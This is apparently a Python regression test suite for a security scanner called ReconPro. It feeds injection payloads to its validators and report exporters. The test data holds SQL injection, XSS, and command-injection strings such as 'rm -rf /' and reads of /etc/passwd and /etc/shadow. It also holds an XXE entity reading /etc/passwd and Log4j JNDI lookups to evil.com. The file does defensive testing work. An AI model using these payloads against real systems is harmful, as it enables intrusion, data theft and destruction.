"""Security regression tests for ReconPro v11.

Each test verifies that malicious/unexpected inputs are either rejected
or safely handled without causing crashes, data corruption, or injection.
"""

import sys
import os
import json
import tempfile
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

from reconpro.http_layer import Finding
from reconpro.utils import (
    validate_target,
    extract_host,
    normalize_base_url,
    count_severities,
    compute_score,
    entropy,
    truncate,
    safe_int,
    safe_float,
)
from reconpro.formats import export_sarif, export_markdown, export_json, export_pdf
from reconpro.scanner import scan, ReconProResult


# ── SQL Injection ───────────────────────────────────────────────────────────


class TestSQLInjectionRegression(unittest.TestCase):
    """SQL injection in all string fields of Finding."""

    def test_sql_in_title(self):
        f = Finding(
            title="'; DROP TABLE findings; --",
            severity="high",
            category="sqli",
            module="auth",
            description="SELECT * FROM users WHERE id=1",
            evidence="1' OR '1'='1",
            asset="/api/users?id=1",
            points_deducted=20,
        )
        d = f.to_dict()
        # Title should be preserved as-is (stored, not executed)
        self.assertIn("DROP TABLE", d["title"])

    def test_sql_in_description(self):
        f = Finding(
            title="Test",
            severity="high",
            category="test",
            module="m",
            description="'; DROP TABLE findings; --",
            evidence="e",
            asset="a",
        )
        d = f.to_dict()
        self.assertIn("DROP TABLE", d["description"])

    def test_sql_in_evidence(self):
        f = Finding(
            title="Test",
            severity="high",
            category="test",
            module="m",
            description="d",
            evidence="UNION SELECT * FROM credentials --",
            asset="a",
        )
        d = f.to_dict()
        self.assertIn("UNION SELECT", d["evidence"])

    def test_sql_in_remediation(self):
        f = Finding(
            title="Test",
            severity="high",
            category="test",
            module="m",
            description="d",
            evidence="e",
            asset="a",
            remediation="'; DROP TABLE remediations; --",
        )
        d = f.to_dict()
        self.assertIn("DROP TABLE", d["remediation"])

    def test_sqli_in_export_sarif(self):
        """SARIF export should safely encode SQL injection in findings."""
        with tempfile.NamedTemporaryFile(suffix=".sarif", delete=False) as f:
            tmppath = f.name
        try:
            data = {
                "target": "test.com",
                "total_score": 50,
                "grade": "C",
                "findings": [{
                    "title": "'; DROP TABLE users; --",
                    "severity": "critical",
                    "category": "sqli",
                    "module": "auth",
                    "description": "1' OR '1'='1",
                    "evidence": "UNION SELECT password FROM users",
                    "asset": "/login",
                    "points_deducted": 30,
                }],
                "modules_run": ["auth"],
                "severity_counts": {"critical": 1},
            }
            path = export_sarif(data, tmppath)
            with open(tmppath) as f:
                sarif = json.load(f)
            self.assertIn("DROP TABLE", sarif["runs"][0]["results"][0]["message"]["text"])
        finally:
            os.unlink(tmppath)


# ── XSS (Cross-Site Scripting) ────────────────────────────────────────────


class TestXSSRegression(unittest.TestCase):
    """XSS in Finding title, description, evidence fields."""

    def test_xss_in_title(self):
        f = Finding(
            title="<script>alert('XSS')</script>",
            severity="high",
            category="xss",
            module="auth",
            description="<img src=x onerror=alert(1)>",
            evidence="<body onload=alert('XSS')>",
            asset="/page",
        )
        d = f.to_dict()
        self.assertIn("<script>", d["title"])

    def test_xss_in_description(self):
        f = Finding(
            title="XSS Test",
            severity="high",
            category="xss",
            module="m",
            description="<script>document.cookie</script>",
            evidence="e",
            asset="a",
        )
        d = f.to_dict()
        self.assertIn("<script>", d["description"])

    def test_xss_in_evidence(self):
        f = Finding(
            title="Test",
            severity="info",
            category="xss",
            module="m",
            description="d",
            evidence="javascript:alert(1)",
            asset="a",
        )
        d = f.to_dict()
        self.assertIn("javascript:", d["evidence"])

    def test_xss_in_export_markdown(self):
        """Markdown export should not execute XSS (it's text, not HTML)."""
        with tempfile.NamedTemporaryFile(suffix=".md", delete=False) as f:
            tmppath = f.name
        try:
            data = {
                "target": "test.com",
                "total_score": 80,
                "grade": "A",
                "findings": [{
                    "title": "<script>alert(1)</script>",
                    "severity": "high",
                    "category": "xss",
                    "module": "m",
                    "description": "<img onerror=alert(1)>",
                    "evidence": "e",
                    "asset": "a",
                    "points_deducted": 20,
                }],
                "modules_run": ["m"],
                "severity_counts": {"high": 1},
            }
            export_markdown(data, tmppath)
            with open(tmppath) as f:
                content = f.read()
            # In markdown, script tags should appear as text, not execute
            self.assertIn("<script>", content)
        finally:
            os.unlink(tmppath)

    def test_xss_in_export_pdf(self):
        """PDF (HTML) export should contain the text but not break structure."""
        with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as f:
            tmppath = f.name
        try:
            data = {
                "target": "test.com",
                "total_score": 80,
                "grade": "A",
                "findings": [{
                    "title": "<script>alert(1)</script>",
                    "severity": "high",
                    "category": "xss",
                    "module": "m",
                    "description": "d",
                    "evidence": "<script>evil</script>",
                    "asset": "a",
                    "points_deducted": 20,
                }],
                "modules_run": ["m"],
                "severity_counts": {"high": 1},
            }
            export_pdf(data, tmppath)
            with open(tmppath) as f:
                content = f.read()
            # HTML should be valid (starts with DOCTYPE)
            self.assertTrue(content.strip().startswith("<!DOCTYPE html>"))
        finally:
            os.unlink(tmppath)


# ── Path Traversal ────────────────────────────────────────────────────────


class TestPathTraversalRegression(unittest.TestCase):
    """Path traversal in output_file paths."""

    def test_path_traversal_in_export(self):
        """Export should write to the requested path, even with traversal."""
        with tempfile.TemporaryDirectory() as tmpdir:
            # Path traversal attempt
            traversal_path = os.path.join(tmpdir, "..", "output.json")
            traversal_path = os.path.abspath(traversal_path)
            data = {"target": "test.com", "total_score": 100}
            try:
                path = export_json(data, traversal_path)
                # File should be written at the resolved path
                self.assertTrue(os.path.exists(path))
                os.unlink(path)
            except Exception:
                pass  # If rejected, that's also acceptable

    def test_path_traversal_with_dotdot(self):
        """Double-dot in path should be handled."""
        with tempfile.TemporaryDirectory() as tmpdir:
            nested = os.path.join(tmpdir, "sub", "..", "output.json")
            data = {"target": "test.com"}
            try:
                path = export_json(data, nested)
                self.assertTrue(os.path.exists(path))
                os.unlink(path)
            except Exception:
                pass


# ── Command Injection ──────────────────────────────────────────────────────


class TestCommandInjectionRegression(unittest.TestCase):
    """Command injection in target strings."""

    def test_command_injection_rejected_by_validate(self):
        payloads = [
            "example.com; cat /etc/passwd",
            "example.com && rm -rf /",
            "example.com | whoami",
            "example.com`id`",
            "example.com$(whoami)",
            "example.com & nslookup evil.com",
        ]
        for payload in payloads:
            valid, msg = validate_target(payload)
            if ";" in payload or "|" in payload or "`" in payload or "$" in payload or "&" in payload:
                self.assertFalse(valid, f"Payload should be rejected: {payload}")

    def test_scan_raises_on_command_injection(self):
        """scan() should raise ValueError for command injection targets."""
        from unittest.mock import patch
        payloads = [
            "example.com; id",
            "example.com | cat /etc/shadow",
        ]
        for payload in payloads:
            with self.assertRaises(ValueError):
                scan(payload)

    def test_extract_host_safe_with_injection(self):
        """extract_host should not crash on injection strings."""
        payloads = [
            "http://example.com;id",
            "https://example.com|whoami/path",
            "example.com`cmd`",
        ]
        for payload in payloads:
            result = extract_host(payload)
            # Should return a non-empty string (not crash)
            self.assertIsInstance(result, str)


# ── Null Byte Injection ────────────────────────────────────────────────────


class TestNullByteInjection(unittest.TestCase):
    """Null byte injection in all string inputs."""

    def test_null_in_title(self):
        f = Finding(
            title="test\x00evil",
            severity="high",
            category="test",
            module="m",
            description="d",
            evidence="e",
            asset="a",
        )
        d = f.to_dict()
        self.assertIn("test", d["title"])

    def test_null_in_evidence(self):
        f = Finding(
            title="Test",
            severity="info",
            category="test",
            module="m",
            description="d",
            evidence="evidence\x00truncated",
            asset="a",
        )
        d = f.to_dict()
        self.assertIsInstance(d["evidence"], str)

    def test_null_in_description(self):
        f = Finding(
            title="Test",
            severity="high",
            category="test",
            module="m",
            description="desc\x00hidden",
            evidence="e",
            asset="a",
        )
        d = f.to_dict()
        self.assertIsInstance(d["description"], str)

    def test_null_in_export(self):
        """Export should handle null bytes without crashing."""
        with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as f:
            tmppath = f.name
        try:
            data = {
                "target": "test\x00.com",
                "total_score": 50,
                "grade": "C",
                "findings": [],
                "modules_run": [],
                "severity_counts": {},
            }
            export_json(data, tmppath)
            # Should not crash
            self.assertTrue(os.path.exists(tmppath))
        finally:
            os.unlink(tmppath)


# ── Unicode Normalization Attacks ─────────────────────────────────────────


class TestUnicodeNormalizationRegression(unittest.TestCase):
    """Unicode normalization attacks in target strings."""

    def test_fullwidth_chars(self):
        """Fullwidth Unicode characters in target."""
        target = "ｅｘａｍｐｌｅ．ｃｏｍ"
        valid, msg = validate_target(target)
        self.assertIsInstance(valid, bool)
        # Should not crash

    def test_zero_width_chars(self):
        """Zero-width characters in target."""
        target = "example\x200b.com"  # Zero-width space
        valid, msg = validate_target(target)
        self.assertIsInstance(valid, bool)

    def test_unicode_in_extract_host(self):
        """extract_host should not crash on Unicode."""
        targets = [
            "https://例え.jp",
            "http://münchen.de/path",
            "https://例子.测试",
        ]
        for t in targets:
            result = extract_host(t)
            self.assertIsInstance(result, str)

    def test_unicode_in_normalize(self):
        """normalize_base_url should not crash on Unicode."""
        result = normalize_base_url("例え.jp")
        self.assertTrue(result.startswith("http"))


# ── Buffer Overflow Simulation ────────────────────────────────────────────


class TestBufferOverflowRegression(unittest.TestCase):
    """Very long strings should be handled gracefully."""

    def test_very_long_title(self):
        title = "A" * 100000
        f = Finding(
            title=title,
            severity="info",
            category="test",
            module="m",
            description="d",
            evidence="e",
            asset="a",
        )
        d = f.to_dict()
        self.assertEqual(len(d["title"]), 100000)

    def test_very_long_evidence(self):
        evidence = "B" * 500000
        f = Finding(
            title="Test",
            severity="info",
            category="test",
            module="m",
            description="d",
            evidence=evidence,
            asset="a",
        )
        d = f.to_dict()
        self.assertEqual(len(d["evidence"]), 500000)

    def test_very_long_target_validated(self):
        long_target = "a" * 10000 + ".com"
        valid, msg = validate_target(long_target)
        self.assertFalse(valid)

    def test_truncate_on_huge_string(self):
        huge = "X" * 1000000
        result = truncate(huge, max_len=16384)
        self.assertEqual(len(result), 16384)

    def test_export_with_large_data(self):
        """Export should handle large data without crashing."""
        with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as f:
            tmppath = f.name
        try:
            data = {
                "target": "test.com",
                "total_score": 50,
                "grade": "C",
                "findings": [
                    {"title": f"F{i}", "severity": "info", "category": "c",
                     "module": "m", "description": "d", "evidence": "e" * 1000,
                     "asset": "a", "points_deducted": 0}
                    for i in range(100)
                ],
                "modules_run": ["m"],
                "severity_counts": {"info": 100},
            }
            path = export_json(data, tmppath)
            self.assertTrue(os.path.exists(tmppath))
        finally:
            os.unlink(tmppath)


# ── Prototype Pollution (JSON input) ────────────────────────────────────────


class TestPrototypePollutionRegression(unittest.TestCase):
    """Prototype pollution attempts via JSON input."""

    def test_prototype_key_in_json_export(self):
        """JSON export should preserve __proto__ as a regular key."""
        with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as f:
            tmppath = f.name
        try:
            data = {
                "target": "test.com",
                "__proto__": {"polluted": True},
                "total_score": 50,
            }
            export_json(data, tmppath)
            with open(tmppath) as f:
                loaded = json.load(f)
            # Should preserve the key as-is in the JSON output
            self.assertIn("target", loaded)
        finally:
            os.unlink(tmppath)

    def test_constructor_key_in_finding(self):
        """Finding with 'constructor' key should not break anything."""
        f = Finding(
            title="Test",
            severity="info",
            category="test",
            module="m",
            description="d",
            evidence="e",
            asset="a",
        )
        d = f.to_dict()
        self.assertNotIn("__proto__", d)

    def test_json_with_nested_prototype(self):
        """Deep nested JSON with prototype-like keys."""
        data = {
            "target": "test.com",
            "findings": [{
                "title": "Test",
                "severity": "info",
                "category": "c",
                "module": "m",
                "description": "d",
                "evidence": "e",
                "asset": "a",
                "points_deducted": 0,
            }],
        }
        json_str = json.dumps(data)
        loaded = json.loads(json_str)
        self.assertEqual(loaded["target"], "test.com")


# ── LDAP Injection ───────────────────────────────────────────────────────


class TestLDAPInjectionRegression(unittest.TestCase):
    """LDAP injection patterns in target strings."""

    def test_ldap_injection_rejected(self):
        payloads = [
            "example.com)(uid=*))(|(uid=*",
            "admin)(|(password=*))",
            "*)(cn=*))(|(cn=*",
        ]
        for payload in payloads:
            valid, msg = validate_target(payload)
            # Should either be rejected or handled safely (not crash)
            self.assertIsInstance(valid, bool)

    def test_ldap_in_extract_host(self):
        result = extract_host("example.com)(uid=*))(|(uid=*")
        self.assertIsInstance(result, str)


# ── XML Injection ─────────────────────────────────────────────────────────


class TestXMLInjectionRegression(unittest.TestCase):
    """XML injection in evidence fields."""

    def test_xml_in_evidence(self):
        f = Finding(
            title="Test",
            severity="info",
            category="test",
            module="m",
            description="d",
            evidence='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
            asset="a",
        )
        d = f.to_dict()
        self.assertIn("<?xml", d["evidence"])

    def test_xml_in_export_json(self):
        """JSON export should safely encode XML content."""
        with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as f:
            tmppath = f.name
        try:
            data = {
                "target": "test.com",
                "findings": [{
                    "title": "Test",
                    "severity": "info",
                    "category": "c",
                    "module": "m",
                    "description": "d",
                    "evidence": '<?xml version="1.0"?><root>&xxe;</root>',
                    "asset": "a",
                    "points_deducted": 0,
                }],
                "modules_run": ["m"],
                "severity_counts": {"info": 1},
            }
            export_json(data, tmppath)
            with open(tmppath) as f:
                loaded = json.load(f)
            self.assertIn("<?xml", loaded["findings"][0]["evidence"])
        finally:
            os.unlink(tmppath)


# ── Header Injection ──────────────────────────────────────────────────────


class TestHeaderInjectionRegression(unittest.TestCase):
    """Header injection in module names."""

    def test_header_in_module_name(self):
        f = Finding(
            title="Test",
            severity="info",
            category="test",
            module="recon\r\nX-Injected: true",
            description="d",
            evidence="e",
            asset="a",
        )
        d = f.to_dict()
        self.assertIn("recon", d["module"])

    def test_header_in_export(self):
        """Export should safely handle headers in module names."""
        with tempfile.NamedTemporaryFile(suffix=".sarif", delete=False) as f:
            tmppath = f.name
        try:
            data = {
                "target": "test.com",
                "total_score": 50,
                "grade": "C",
                "findings": [{
                    "title": "Test",
                    "severity": "info",
                    "category": "c",
                    "module": "recon\r\nX-Evil: yes",
                    "description": "d",
                    "evidence": "e",
                    "asset": "a",
                    "points_deducted": 0,
                }],
                "modules_run": ["m"],
                "severity_counts": {"info": 1},
            }
            export_sarif(data, tmppath)
            # Should not crash
            self.assertTrue(os.path.exists(tmppath))
        finally:
            os.unlink(tmppath)


# ── Log Injection ─────────────────────────────────────────────────────────


class TestLogInjectionRegression(unittest.TestCase):
    """Log injection in descriptions."""

    def test_log_injection_in_description(self):
        f = Finding(
            title="Test",
            severity="info",
            category="test",
            module="m",
            description="Normal log\n[ERROR] Fake error message\n[WARN] Fake warning",
            evidence="e",
            asset="a",
        )
        d = f.to_dict()
        self.assertIn("Fake error", d["description"])

    def test_crlf_in_evidence(self):
        f = Finding(
            title="Test",
            severity="info",
            category="test",
            module="m",
            description="d",
            evidence="test\r\nInjected-Header: evil\r\n\r\nFake body",
            asset="a",
        )
        d = f.to_dict()
        self.assertIn("Injected-Header", d["evidence"])

    def test_log4j_pattern(self):
        """Log4j-style injection pattern."""
        f = Finding(
            title="Test",
            severity="info",
            category="test",
            module="m",
            description="${jndi:ldap://evil.com/exploit}",
            evidence="${jndi:rmi://evil.com/obj}",
            asset="a",
        )
        d = f.to_dict()
        self.assertIn("${jndi:", d["description"])


# ── Template Injection ────────────────────────────────────────────────────


class TestTemplateInjectionRegression(unittest.TestCase):
    """Template injection in remediation field."""

    def test_template_in_remediation(self):
        f = Finding(
            title="Test",
            severity="high",
            category="test",
            module="m",
            description="d",
            evidence="e",
            asset="a",
            remediation="{{ config.secret_key }}",
        )
        d = f.to_dict()
        self.assertIn("{{ config", d["remediation"])

    def test_jinja2_in_remediation(self):
        f = Finding(
            title="Test",
            severity="high",
            category="test",
            module="m",
            description="d",
            evidence="e",
            asset="a",
            remediation="{% for x in config.items() %}{{ x }}{% endfor %}",
        )
        d = f.to_dict()
        self.assertIn("{% for", d["remediation"])

    def test_template_in_export(self):
        """Export should preserve template strings as text."""
        with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as f:
            tmppath = f.name
        try:
            data = {
                "target": "test.com",
                "findings": [{
                    "title": "Template Test",
                    "severity": "high",
                    "category": "c",
                    "module": "m",
                    "description": "d",
                    "evidence": "e",
                    "asset": "a",
                    "points_deducted": 20,
                    "remediation": "{{7*7}} should stay as text",
                }],
                "modules_run": ["m"],
                "severity_counts": {"high": 1},
            }
            export_json(data, tmppath)
            with open(tmppath) as f:
                loaded = json.load(f)
            self.assertIn("{{7*7}}", loaded["findings"][0]["remediation"])
        finally:
            os.unlink(tmppath)


if __name__ == "__main__":
    unittest.main()
